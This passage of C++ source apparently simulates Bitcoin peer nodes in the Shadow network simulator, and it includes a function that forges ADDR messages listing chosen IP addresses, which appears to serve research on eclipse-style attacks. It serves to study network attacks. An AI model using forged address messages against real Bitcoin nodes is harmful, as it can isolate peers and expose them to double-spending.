//
// Created by ilios on 20. 10. 06..
//

#include <ev++.h>

#include <algorithm>
#include <string_view>
#include <iostream>
#include <deque>

#include "shadow_interface.h"
#include <arpa/inet.h>
#include <fcntl.h> /* Added for the nonblocking socket */
#include <memory>

#include <util/system.h>
#include <bitcoind.h>
#include <net.h>
#include <util/strencodings.h>
#include <netmessagemaker.h>
#include <chainparams.h>

#include <regex>
#include <random>
#include <chrono>
#include <iomanip>

typedef unsigned int SOCKET;
#define INVALID_SOCKET      (SOCKET)(~0)


std::string string_to_hex(const std::string &input) {
    static const char hex_digits[] = "0123456789ABCDEF";

    std::string output;
    output.reserve(input.length() * 2);
    for (unsigned char c : input) {
        output.push_back(hex_digits[c >> 4]);
        output.push_back(hex_digits[c & 15]);
    }
    return output;
}

// Convert string of hex numbers to its equivalent char-stream
std::string hex_to_string(const std::string &hexstr) {
    std::string output;
    output.resize((hexstr.size() + 1) / 2);

    for (size_t i = 0, j = 0; i < output.size(); i++, j++) {
        output[i] = (hexstr[j] & '@' ? hexstr[j] + 9 : hexstr[j]) << 4, j++;
        output[i] |= (hexstr[j] & '@' ? hexstr[j] + 9 : hexstr[j]) & 0xF;
    }
    return output;
}

std::map<std::string, int> mPingTimestamp;

// bitcoin specific interface for receiving data.
// Read a 'nBytes' data from datastream ('pch'),
// then push back to message queues ('vRecvMsg' and 'vProcessMsg').
// Almost code are borrowed from net.cpp of Bitcoin repo.
bool BitcoinReceiveMsg(const char *pch, unsigned int nBytes, std::list<CNetMessage> &vRecvMsg,
                       std::list<CNetMessage> &vProcessMsg) {
    while (nBytes > 0) {
        // get current incomplete message, or create a new one
        if (vRecvMsg.empty() || vRecvMsg.back().complete())
            vRecvMsg.push_back(CNetMessage(Params().MessageStart(), SER_NETWORK, INIT_PROTO_VERSION));

        CNetMessage &msg = vRecvMsg.back();

        // absorb network data
        int handled;
        if (!msg.in_data)
            handled = msg.readHeader(pch, nBytes);
        else
            handled = msg.readData(pch, nBytes);

        if (handled < 0)
            return false;

        if (msg.in_data && msg.hdr.nMessageSize > MAX_PROTOCOL_MESSAGE_LENGTH) {
            LogPrint(BCLog::NET, "Oversized message, disconnecting\n");
            return false;
        }

        pch += handled;
        nBytes -= handled;
    }

    auto it(vRecvMsg.begin());
    for (; it != vRecvMsg.end(); ++it) {
        if (!it->complete())
            break;
    }
    vProcessMsg.splice(vProcessMsg.end(), vRecvMsg, vRecvMsg.begin(), it);

    for (CNetMessage &a : vProcessMsg) {
        std::cout << "received command:" << a.hdr.GetCommand() << "\n";
    }

    return true;
}

// bitcoin specific interface for processing messages.
// Read and process a message 'msg',
// then push back any necessary replies to message queue ('vSendMsg').
// Almost code are borrowed from net_processing.cpp of Bitcoin repo.
bool BitcoinProcessMsg(CNetMessage &msg, bool fromInbound, std::deque<std::vector<unsigned char>> &vSendMsg,
                       std::string their_ip, uint16_t their_port, std::string my_ip, bool shadow_node) {

    // const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'}; // for testnet 0b110907
    const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9

    std::cout << "bitcoin process msg" << "\n";

    if (memcmp(msg.hdr.pchMessageStart, MessageStartChars, CMessageHeader::MESSAGE_START_SIZE) != 0) {
        std::cout << "INVALID MESSAGESTART " << msg.hdr.GetCommand() << "\n";
        exit(-1);
    }

    // their_addr
    CAddress their_addr;
    struct sockaddr_in new_addr;    /* my address information */
    new_addr.sin_family = AF_INET;         /* host byte order */
    new_addr.sin_port = htons(their_port);     /* short, network byte order */
    new_addr.sin_addr.s_addr = inet_addr(their_ip.c_str());
    bzero(&(new_addr.sin_zero), 8);        /* zero the rest of the struct */

    if (!their_addr.SetSockAddr((const struct sockaddr *) &new_addr)) {
        LogPrintf("Warning: Unknown socket family\n");
    }

    // Read header
    CMessageHeader &hdr = msg.hdr;
    if (!hdr.IsValid(MessageStartChars)) {
        LogPrint(BCLog::NET, "PROCESSMESSAGE: ERRORS IN HEADER %s\n", hdr.GetCommand());
        exit(-1);
    }
    std::string strCommand = hdr.GetCommand();
    CDataStream &vRecv = msg.vRecv;

    std::cout << "bitcoin process msg : " << strCommand << "\n";

    if (strCommand == NetMsgType::VERSION) {
        int64_t nTime;
        CAddress addrMe;
        CAddress addrFrom;
        uint64_t nNonce = 1;
        uint64_t nServiceInt;
        ServiceFlags nServices;
        int nVersion;
        int nSendVersion;
        std::string cleanSubVer;
        int nStartingHeight = -1;
        bool fRelay = true;

        vRecv >> nVersion >> nServiceInt >> nTime >> addrMe;
        nSendVersion = std::min(nVersion, PROTOCOL_VERSION);
        nServices = ServiceFlags(nServiceInt);

        if (!vRecv.empty())
            vRecv >> addrFrom >> nNonce;
        if (!vRecv.empty()) {
            std::string strSubVer;
            vRecv >> LIMITED_STRING(strSubVer, MAX_SUBVERSION_LENGTH);
            cleanSubVer = SanitizeString(strSubVer);
        }
        if (!vRecv.empty()) {
            vRecv >> nStartingHeight;
        }
        if (!vRecv.empty())
            vRecv >> fRelay;

        if (fromInbound) {
            // version message
            ServiceFlags nLocalNodeServices = ServiceFlags(NODE_NETWORK | NODE_WITNESS | NODE_NETWORK_LIMITED);
            uint64_t nonce = 0;
            int myNodeStartingHeight = nStartingHeight;

            CSerializedNetMsg msg = CNetMsgMaker(INIT_PROTO_VERSION).Make(NetMsgType::VERSION, PROTOCOL_VERSION,
                                                                          (uint64_t) nLocalNodeServices, nTime,
                                                                          their_addr, addrFrom, nonce, strSubVersion,
                                                                          myNodeStartingHeight, true);

            size_t nMessageSize = msg.data.size();
            //size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
            LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);

            std::vector<unsigned char> serializedHeader;
            serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
            uint256 hash = Hash(msg.data.data(), msg.data.data() + nMessageSize);
            CMessageHeader hdr(MessageStartChars, msg.command.c_str(), nMessageSize);
            memcpy(hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

            CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, serializedHeader, 0, hdr};

            vSendMsg.push_back(std::move(serializedHeader));
            if (nMessageSize) {
                vSendMsg.push_back(std::move(msg.data));
            }
        }

        {
            // send verack message
            CSerializedNetMsg verack_msg = CNetMsgMaker(INIT_PROTO_VERSION).Make(NetMsgType::VERACK);
            size_t nMessageSize = verack_msg.data.size();
            LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(verack_msg.command.c_str()), nMessageSize);

            std::vector<unsigned char> verack_serializedHeader;
            verack_serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
            uint256 hash = Hash(verack_msg.data.data(), verack_msg.data.data() + nMessageSize);
            CMessageHeader verack_hdr(MessageStartChars, verack_msg.command.c_str(), nMessageSize);
            memcpy(verack_hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

            CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, verack_serializedHeader, 0, verack_hdr};

            vSendMsg.push_back(std::move(verack_serializedHeader));
            if (nMessageSize) {
                vSendMsg.push_back(std::move(verack_msg.data));
            }
        }

    } else if (strCommand == NetMsgType::PING) {
        std::cout << "received PING" << "\n";
        uint64_t nonce = 0;
        vRecv >> nonce;

        CSerializedNetMsg msg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PONG, nonce);

        size_t nMessageSize = msg.data.size();
        //size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
        // LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);

        std::vector<unsigned char> serializedHeader;
        serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
        uint256 hash = Hash(msg.data.data(), msg.data.data() + nMessageSize);
        CMessageHeader hdr(MessageStartChars, msg.command.c_str(), nMessageSize);
        memcpy(hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

        CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, serializedHeader, 0, hdr};

        vSendMsg.push_back(std::move(serializedHeader));
        if (nMessageSize) {
            vSendMsg.push_back(std::move(msg.data));
        }
        if (fromInbound && shadow_node) {
            mPingTimestamp[my_ip] = GetTime();
            std::cout << "my_ip(shadow)=" << my_ip << "\n";
        }
    }
    return true;
}

// bitcoin specific interface for forging ADDR MSG.
// Create a ADDR message for `vIP`,
// then push it to message queue ('vSendMsg').
bool BitcoinForgeAddrMsg(std::vector<std::string> vIP, std::deque<std::vector<unsigned char>> &vSendMsg,
                         std::string their_ip, uint16_t their_port) {
    // const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'}; // for testnet 0b110907
    const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9

    ServiceFlags nLocalNodeServices = ServiceFlags(NODE_NETWORK | NODE_WITNESS | NODE_NETWORK_LIMITED);
    std::vector<CAddress> vAddr;
    vAddr.reserve(vIP.size());
    for (std::string ip : vIP) {
        struct in_addr in_addr_ip;
        in_addr_ip.s_addr = inet_addr(ip.c_str());
        CAddress addr = CAddress(CService(CNetAddr(in_addr_ip), 8333), nLocalNodeServices);

        vAddr.push_back(addr);
    }
    CSerializedNetMsg msg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::ADDR, vAddr);

    size_t nMessageSize = msg.data.size();
    size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
    LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);

    std::vector<unsigned char> serializedHeader;
    serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
    uint256 hash = Hash(msg.data.data(), msg.data.data() + nMessageSize);
    CMessageHeader hdr(MessageStartChars, msg.command.c_str(), nMessageSize);
    memcpy(hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

    CVectorWriter{SER_NETWORK, PROTOCOL_VERSION, serializedHeader, 0, hdr};

    vSendMsg.push_back(std::move(serializedHeader));
    if (nMessageSize) {
        vSendMsg.push_back(std::move(msg.data));
    }

    return true;
}


// bitcoin specific interface for initializing protocol.
// Create a new version message,
// then push it to message queue ('vSendMsg').
// Almost code are borrowed from net_processing.cpp of Bitcoin repo.
bool BitcoinInitProto(std::deque<std::vector<unsigned char>> &vSendMsg, std::string their_ip, uint16_t their_port) {

    // TODO : more generic interface is required for switching between network automatically
    // const unsigned char MessageStartChars[4] = {'\v', '\021', '\t', '\a'}; // for testnet 0b110907
    const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9


    // their_addr
    CAddress their_addr;
    struct sockaddr_in new_addr;    /* my address information */
    new_addr.sin_family = AF_INET;         /* host byte order */
    new_addr.sin_port = htons(their_port);     /* short, network byte order */
    new_addr.sin_addr.s_addr = inet_addr(their_ip.c_str());
    bzero(&(new_addr.sin_zero), 8);        /* zero the rest of the struct */

    if (!their_addr.SetSockAddr((const struct sockaddr *) &new_addr)) {
        LogPrintf("Warning: Unknown socket family\n");
    }

    // version message
    ServiceFlags nLocalNodeServices = ServiceFlags(NODE_NETWORK | NODE_WITNESS | NODE_NETWORK_LIMITED);
    uint64_t nonce = 0;
    int myNodeStartingHeight = 0;
    CAddress addrMe = CAddress(CService(), nLocalNodeServices);

    CSerializedNetMsg msg = CNetMsgMaker(INIT_PROTO_VERSION).Make(NetMsgType::VERSION, PROTOCOL_VERSION,
                                                                  (uint64_t) nLocalNodeServices, GetTime(),
                                                                  their_addr, addrMe, nonce, strSubVersion,
                                                                  myNodeStartingHeight, true);

    size_t nMessageSize = msg.data.size();
    //size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
    LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);

    std::vector<unsigned char> serializedHeader;
    serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
    uint256 hash = Hash(msg.data.data(), msg.data.data() + nMessageSize);
    CMessageHeader hdr(MessageStartChars, msg.command.c_str(), nMessageSize);
    memcpy(hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

    CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, serializedHeader, 0, hdr};

    vSendMsg.push_back(std::move(serializedHeader));
    if (nMessageSize) {
        vSendMsg.push_back(std::move(msg.data));
    }
    return true;
}

template<typename MSG>
class SocketControlStruct {
private:
    SOCKET _socketfd;
    size_t _offset;
    bool fInbound;
    std::unique_ptr<ev::io> _connsocket_watcher;
    std::unique_ptr<ev::io> _datasocket_watcher;
    std::list<MSG> vRecvMsg;
    std::list<MSG> vProcessMsg;
    std::deque<std::vector<unsigned char>> vSendMsg;

public:
    std::string their_ip;
    uint16_t their_port;

    SocketControlStruct() {}

    SocketControlStruct(int fd, std::string ip, uint16_t port, bool inbound = true) {
        _offset = 0;
        _socketfd = fd;
        their_ip = ip, their_port = port;
        fInbound = inbound;
        _connsocket_watcher = std::make_unique<ev::io>();
        _datasocket_watcher = std::make_unique<ev::io>();
    }

    size_t getSendOffset() { return _offset; }

    void setSendOffset(size_t offset) { _offset = offset; }

    std::list<MSG> &getVRecvMsg() { return vRecvMsg; }

    std::list<MSG> &getVProcessMsg() { return vProcessMsg; }

    std::deque<std::vector<unsigned char>> &getVSendMsg() { return vSendMsg; }

    ev::io &getDataSocketWatcher() { return *_datasocket_watcher; }

    ev::io &getConnSocketWatcher() { return *_connsocket_watcher; }

    bool isInboundSocket() { return fInbound; }

    // Copy constructor : it is needed due to rvalue(?) assignment for std::map. Don't copy a watcher.
    // TODO : do not use copy. but use only move because watcher cannot be copied(?).
//    SocketControlStruct(const SocketControlStruct &s2) {
//        _socketfd = s2._socketfd;
//        _offset = s2._offset;
//        fInbound = s2.fInbound;
//        vRecvMsg = s2.vRecvMsg;
//        vProcessMsg = s2.vProcessMsg;
//        vSendMsg = s2.vSendMsg;
//        their_ip = s2.their_ip;
//        their_port = s2.their_port;
//    }

};


template<typename MSG,
        bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t, std::string,
                           bool)>
class PassiveNode {
private:
    ev::io _listen_watcher; // assume a single listening socket per Node
    int _listen_sockfd;
    std::string _shadow_ip;
    double _churnout_time = -1;
    ev::timer _churnout_timer;
    bool _shadowNode;

    int _received_msg_count = 0;

    // data structures
    std::map<SOCKET, SocketControlStruct<MSG> > mSocketControl;

    void _listenSocketIOCallback(ev::io &w, int revents) {
        std::cout << "listen socket IO callback called!" << "\n";

        if (_shadowNode)
            std::cout << "shadowNode(" << _shadow_ip << ") connected" << "\n";

        struct sockaddr_in their_addr; /* connector's address information */
        int sock_fd;
        socklen_t sin_size;

        sin_size = sizeof(struct sockaddr_in);
        sock_fd = accept(w.fd, (struct sockaddr *) &their_addr, &sin_size);
        if (sock_fd != -1) {
            fcntl(sock_fd, F_SETFL, O_NONBLOCK);

            // Create DataSocket and start a event watcher for the DataSocket
            mSocketControl.try_emplace(sock_fd, SocketControlStruct<MSG>(sock_fd, inet_ntoa(their_addr.sin_addr),
                                                                         ntohs(their_addr.sin_port)));
            std::cout << "server: got connection from " << mSocketControl[sock_fd].their_ip << ":"
                      << mSocketControl[sock_fd].their_port << "\n";

            ev::io &watcher = mSocketControl[sock_fd].getDataSocketWatcher();
            watcher.set<PassiveNode, &PassiveNode::_dataSocketIOCallback>(this);
            watcher.start(sock_fd, ev::READ);
        } else {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                std::cout << "accept() failed errno=" << errno << strerror(errno) << "\n";
                exit(-1);
            }
        }
    }

    void _dataSocketIOCallback(ev::io &w, int revents) {
        std::cout << "data socket IO callback called!" << "\n";

        int datasock_fd = w.fd;
        auto &socketControl = mSocketControl[datasock_fd];
        std::list<MSG> &vRecvMsg = socketControl.getVRecvMsg();
        std::list<MSG> &vProcessMsg = socketControl.getVProcessMsg();
        std::deque<std::vector<unsigned char>> &vSendMsg = socketControl.getVSendMsg();

        if (revents & EV_READ) {
            std::cout << "DoRecv!" << "\n";

            // recv from socket, and append received data into the buffer.
            // typical socket buffer is 8K-64K
            char pchBuf[0x10000];

            int nBytes = 0;

            nBytes = recv(datasock_fd, pchBuf, sizeof(pchBuf), MSG_DONTWAIT); // What is the meaning of MSG_DONTWAIT?
            if (nBytes > 0) {
                std::string recv_str(pchBuf, nBytes);
                std::cout << "received data(" << _shadow_ip << "):[" << recv_str << "]" << "\n";
                std::cout << "received data(" << _shadow_ip << ") hex:[" << string_to_hex(recv_str) << "]" << "\n";

                bool ret = ReceiveMSG(pchBuf, nBytes, vRecvMsg, vProcessMsg);
                if (!ret) {
                    std::cout << "error while ReceiveMSG" << "\n";
                    exit(-1);
                }

                while (!vProcessMsg.empty()) {
                    // Just take one message
                    MSG &msg = vProcessMsg.front();

                    // process message
                    ret = ProcessMSG(msg, socketControl.isInboundSocket(), vSendMsg, socketControl.their_ip,
                                     socketControl.their_port, _shadow_ip, _shadowNode);
                    if (!ret) {
                        std::cout << "error while processing message" << "\n";
                        exit(-1);
                    }
                    if (!vSendMsg.empty()) // set Writable
                        socketControl.getDataSocketWatcher().set(datasock_fd, ev::READ | ev::WRITE);

                    vProcessMsg.pop_front();
                }

            } else if (nBytes == 0) {
                std::cout << "connection closed while recv" << "\n";
                close(w.fd);
                mSocketControl.erase(w.fd);
            } else if (nBytes < 0) {
                // error
                std::cout << "Error while recv" << "\n";
            }
        } else if (revents & EV_WRITE) {
            auto it = vSendMsg.begin();
            size_t nSentSize = 0;

            size_t nSendOffset = socketControl.getSendOffset();

            while (it != vSendMsg.end()) {
                const auto &data = *it;
                assert(data.size() > nSendOffset);
                int nBytes = 0;
                {
                    nBytes = send(datasock_fd, reinterpret_cast<const char *>(data.data()) + nSendOffset,
                                  data.size() - nSendOffset, MSG_NOSIGNAL | MSG_DONTWAIT);
                }
                if (nBytes > 0) {
                    nSendOffset += nBytes;
                    nSentSize += nBytes;
                    if (nSendOffset == data.size()) {
                        nSendOffset = 0;
                        it++;
                    } else {
                        // could not send full message; stop sending more
                        break;
                    }
                } else {
                    if (nBytes < 0) {
                        // error
                        int nErr = WSAGetLastError();
                        if (nErr != WSAEWOULDBLOCK && nErr != WSAEMSGSIZE && nErr != WSAEINTR &&
                            nErr != WSAEINPROGRESS) {
                            LogPrintf("socket send error\n");
                            exit(-1);
                        }
                    }
                    // couldn't send anything at all
                    break;
                }
            }
            socketControl.setSendOffset(nSendOffset);

            if (it == vSendMsg.end()) {
                assert(nSendOffset == 0);
                // unset writable
                socketControl.getDataSocketWatcher().set(datasock_fd, ev::READ);
            }
            vSendMsg.erase(vSendMsg.begin(), it);
        }
    }


    bool SetSocketNonBlocking(const SOCKET &hSocket, bool fNonBlocking) {
        if (fNonBlocking) {
            int fFlags = fcntl(hSocket, F_GETFL, 0);
            if (fcntl(hSocket, F_SETFL, fFlags | O_NONBLOCK) == SOCKET_ERROR) {
                return false;
            }
        } else {
            int fFlags = fcntl(hSocket, F_GETFL, 0);
            if (fcntl(hSocket, F_SETFL, fFlags & ~O_NONBLOCK) == SOCKET_ERROR) {
                return false;
            }
        }

        return true;
    }

    bool CloseSocket(SOCKET &hSocket) {
        if (hSocket == INVALID_SOCKET)
            return false;
        int ret = close(hSocket);
        if (ret) {
            std::cout << "Socket close failed: " << hSocket << "\n";
            exit(-1);
        }
        hSocket = INVALID_SOCKET;
        return ret != SOCKET_ERROR;
    }

    int CreateNewSocket() {
        // Create a TCP socket in the address family of the specified service.
        SOCKET hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (hSocket == INVALID_SOCKET)
            return INVALID_SOCKET;

        // Set the no-delay option (disable Nagle's algorithm) on the TCP socket.
        int set = 1;
        setsockopt(hSocket, IPPROTO_TCP, TCP_NODELAY, (const char *) &set, sizeof(int));

        // Set the non-blocking option on the socket.
        if (!SetSocketNonBlocking(hSocket, true)) {
            CloseSocket(hSocket);
            std::cout << "Setting socket to non-blocking failed" << "\n";
            exit(-1);
        }

        return hSocket;
    }

public:
    PassiveNode(std::string ip_addr, int port, bool shadowNode = false) {
        _shadow_ip = ip_addr;
        _shadowNode = shadowNode;
        std::cout << "Node generated" << "\n";

        int sockfd = CreateNewSocket();

        // bind to shadow's virtual NIC
        struct sockaddr_in new_addr;    /* my address information */
        new_addr.sin_family = AF_INET;         /* host byte order */
        new_addr.sin_port = htons(port);     /* short, network byte order */
        new_addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());
        bzero(&(new_addr.sin_zero), 8);        /* zero the rest of the struct */

        if (shadow_bind(sockfd, (struct sockaddr *) &new_addr, sizeof(struct sockaddr)) == -1) {
            perror("bind");
            exit(1);
        }

        // listen
        if (listen(sockfd, 10) == -1) {
            perror("listen");
            exit(1);
        }

        // register a watcher
        _listen_sockfd = sockfd;
        _listen_watcher.set<PassiveNode, &PassiveNode::_listenSocketIOCallback>(this);
        _listen_watcher.start(_listen_sockfd, ev::READ);
    }

    PassiveNode(PassiveNode &&rhs) noexcept: _listen_sockfd(std::move(rhs._listen_sockfd)),
                                             _shadow_ip(std::move(rhs._shadow_ip)),
                                             mSocketControl(std::move(rhs.mSocketControl)),
                                             _churnout_time(std::move(rhs._churnout_time)),
                                             _shadowNode(std::move(rhs._shadowNode)) {
        rhs._listen_watcher.stop();
        _listen_watcher.set<PassiveNode, &PassiveNode::_listenSocketIOCallback>(this);
        _listen_watcher.start(_listen_sockfd, ev::READ);

        if (_churnout_time != -1 && rhs._churnout_timer.remaining() >= 0) {
            double remaining_time = rhs._churnout_timer.remaining();
            rhs._churnout_timer.stop();
            _churnout_timer.set<PassiveNode, &PassiveNode::_churnoutTimerCallback>(this);
            _churnout_timer.set(remaining_time, 0.);
            _churnout_timer.start();
            std::cout << "passiveNode move constructor!" << "\n";
        }
    }

    PassiveNode(const PassiveNode &rhs) = delete; // since PassiveNode includes watcher


    void _churnoutTimerCallback(ev::timer &w, int revents) {
        std::cout << "churnout timer called(" << _shadow_ip << ")\n";
        ChurnOut();
    }

    void SetChurnOutTimer(double time) {
        if (_churnout_time == -1) {
            _churnout_time = time;
            _churnout_timer.set<PassiveNode, &PassiveNode::_churnoutTimerCallback>(this);
            _churnout_timer.set(_churnout_time, 0.);
            _churnout_timer.start();
        }
    }


    void ChurnOut() {
        // close all datasocket
        for (auto&[fd, socketControl] : mSocketControl) {
            close(fd);
        }
        mSocketControl.clear();
        _listen_watcher.stop();
        close(_listen_sockfd);
    }

};


template<typename MSG,
        bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t, std::string,
                           bool),
        bool (*ForgeAddrMSG)(std::vector<std::string>, std::deque<std::vector<unsigned char>> &, std::string, uint16_t),
        bool (*InitProtocol)(std::deque<std::vector<unsigned char>> &, std::string, uint16_t)>
class ActiveNode {
private:
    ev::io _listen_watcher; // assume a single listening socket per Node
    void _listenSocketIOCallback(ev::io &w, int revents) {
        std::cout << "listen socket IO callback called!" << "\n";

        struct sockaddr_in their_addr; /* connector's address information */
        int sock_fd;
        socklen_t sin_size;

        sin_size = sizeof(struct sockaddr_in);
        sock_fd = accept(w.fd, (struct sockaddr *) &their_addr, &sin_size);
        if (sock_fd != -1) {
            fcntl(sock_fd, F_SETFL, O_NONBLOCK);

            // Create DataSocket and start a event watcher for the DataSocket
            mSocketControl.try_emplace(sock_fd, SocketControlStruct<MSG>(sock_fd, inet_ntoa(their_addr.sin_addr),
                                                                         ntohs(their_addr.sin_port)));
            std::cout << "server: got connection from " << mSocketControl[sock_fd].their_ip << ":"
                      << mSocketControl[sock_fd].their_port << "\n";

            ev::io &watcher = mSocketControl[sock_fd].getDataSocketWatcher();
            watcher.set<ActiveNode, &ActiveNode::_dataSocketIOCallback>(this);
            watcher.start(sock_fd, ev::READ);
        } else {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                std::cout << "accept() failed errno=" << errno << strerror(errno) << "\n";
                exit(-1);
            }
        }
    }

    void _dataSocketIOCallback(ev::io &w, int revents) {
        std::cout << "data socket IO callback called!" << "\n";

        int datasock_fd = w.fd;
        auto &socketControl = mSocketControl[datasock_fd];
        std::list<MSG> &vRecvMsg = socketControl.getVRecvMsg();
        std::list<MSG> &vProcessMsg = socketControl.getVProcessMsg();
        std::deque<std::vector<unsigned char>> &vSendMsg = socketControl.getVSendMsg();

        if (revents & EV_READ) {
            std::cout << "DoRecv!" << "\n";

            // recv from socket, and append received data into the buffer.
            // typical socket buffer is 8K-64K
            char pchBuf[0x10000];

            int nBytes = 0;

            nBytes = recv(datasock_fd, pchBuf, sizeof(pchBuf), MSG_DONTWAIT); // What is the meaning of MSG_DONTWAIT?
            if (nBytes > 0) {
                std::string recv_str(pchBuf, nBytes);
                std::cout << "received data(" << _shadow_ip << "):[" << recv_str << "]" << "\n";
                std::cout << "received data(" << _shadow_ip << ") hex:[" << string_to_hex(recv_str) << "]" << "\n";

                bool ret = ReceiveMSG(pchBuf, nBytes, vRecvMsg, vProcessMsg);
                if (!ret) {
                    std::cout << "error while BitcoinReceiveMsg" << "\n";
                    exit(-1);
                }

                while (!vProcessMsg.empty()) {
                    // Just take one message
                    MSG &msg = vProcessMsg.front();

                    // process message
                    ret = ProcessMSG(msg, socketControl.isInboundSocket(), vSendMsg, socketControl.their_ip,
                                     socketControl.their_port, _shadow_ip, false);
                    if (!ret) {
                        std::cout << "error while processing message" << "\n";
                        exit(-1);
                    }
                    if (!vSendMsg.empty()) // set Writable
                        socketControl.getDataSocketWatcher().set(datasock_fd, ev::READ | ev::WRITE);

                    vProcessMsg.pop_front();
                }

            } else if (nBytes == 0) {
                std::cout << "connection closed while recv" << "\n";
                // delete this; // is it okay for this self-destruction? // TODO : it's not okay for multiple data sockets
                close(w.fd);
                mSocketControl.erase(w.fd);
            } else if (nBytes < 0) {
                // error
                std::cout << "Error while recv" << "\n";
            }
        } else if (revents & EV_WRITE) {
            auto it = vSendMsg.begin();
            size_t nSentSize = 0;

            size_t nSendOffset = socketControl.getSendOffset();

            while (it != vSendMsg.end()) {
                const auto &data = *it;
                assert(data.size() > nSendOffset);
                int nBytes = 0;
                {
                    nBytes = send(datasock_fd, reinterpret_cast<const char *>(data.data()) + nSendOffset,
                                  data.size() - nSendOffset, MSG_NOSIGNAL | MSG_DONTWAIT);
                }
                if (nBytes > 0) {
                    nSendOffset += nBytes;
                    nSentSize += nBytes;
                    if (nSendOffset == data.size()) {
                        nSendOffset = 0;
                        it++;
                    } else {
                        // could not send full message; stop sending more
                        break;
                    }
                } else {
                    if (nBytes < 0) {
                        // error
                        int nErr = WSAGetLastError();
                        if (nErr != WSAEWOULDBLOCK && nErr != WSAEMSGSIZE && nErr != WSAEINTR &&
                            nErr != WSAEINPROGRESS) {
                            LogPrintf("socket send error %s\n");
                            exit(-1);
                        }
                    }
                    // couldn't send anything at all
                    break;
                }
            }
            socketControl.setSendOffset(nSendOffset);

            if (it == vSendMsg.end()) {
                assert(nSendOffset == 0);
                // unset writable
                socketControl.getDataSocketWatcher().set(datasock_fd, ev::READ);
            }
            vSendMsg.erase(vSendMsg.begin(), it);
        }
    }

    void _connSocketIOCallback(ev::io &w, int revents) {
        std::cout << "connect socket IO callback called!" << "\n";
        if (revents & EV_READ) {
            std::cout << "invalid event is triggered for connecting socket. " << "\n";
            exit(-1);
        } else if (revents & EV_WRITE) {
            int err = 0;
            socklen_t len = sizeof(err);
            if (getsockopt(w.fd, SOL_SOCKET, SO_ERROR, &err, &len) < 0) {
                perror("getsockopt"); // Solaris pending error?
                exit(-1);
            }

            if (err) {
                std::cout << "error for SocketConnect" << "\n";
                close(w.fd);

                mSocketControl.erase(w.fd);
                return;
            }

            std::cout << "Socket is successfully connected" << "\n";

            auto &socketControl = mSocketControl[w.fd];
            ev::io &conn_watcher = socketControl.getConnSocketWatcher();
            conn_watcher.stop();


            ev::io &data_watcher = socketControl.getDataSocketWatcher();
            data_watcher.set<ActiveNode, &ActiveNode::_dataSocketIOCallback>(this);
            data_watcher.start(w.fd, ev::READ);

            // send initializing message
            std::deque<std::vector<unsigned char>> &vSendMsg = socketControl.getVSendMsg();
            int ret = InitProtocol(vSendMsg, socketControl.their_ip, socketControl.their_port);
            if (!ret) {
                std::cout << "error while initializing protocol" << "\n";
                exit(-1);
            }
            if (!vSendMsg.empty()) // set Writable
                socketControl.getDataSocketWatcher().set(w.fd, ev::READ | ev::WRITE);
        }
    }


private:
    int _listen_sockfd;
    std::string _shadow_ip;

    // data structures
    std::map<SOCKET, SocketControlStruct<MSG> > mSocketControl;


    bool SetSocketNonBlocking(const SOCKET &hSocket, bool fNonBlocking) {
        if (fNonBlocking) {
            int fFlags = fcntl(hSocket, F_GETFL, 0);
            if (fcntl(hSocket, F_SETFL, fFlags | O_NONBLOCK) == SOCKET_ERROR) {
                return false;
            }
        } else {
            int fFlags = fcntl(hSocket, F_GETFL, 0);
            if (fcntl(hSocket, F_SETFL, fFlags & ~O_NONBLOCK) == SOCKET_ERROR) {
                return false;
            }
        }

        return true;
    }

    bool CloseSocket(SOCKET &hSocket) {
        if (hSocket == INVALID_SOCKET)
            return false;
        int ret = close(hSocket);
        if (ret) {
            std::cout << "Socket close failed: " << hSocket << "\n";
            exit(-1);
        }
        hSocket = INVALID_SOCKET;
        return ret != SOCKET_ERROR;
    }

    int CreateNewSocket() {
        // Create a TCP socket in the address family of the specified service.
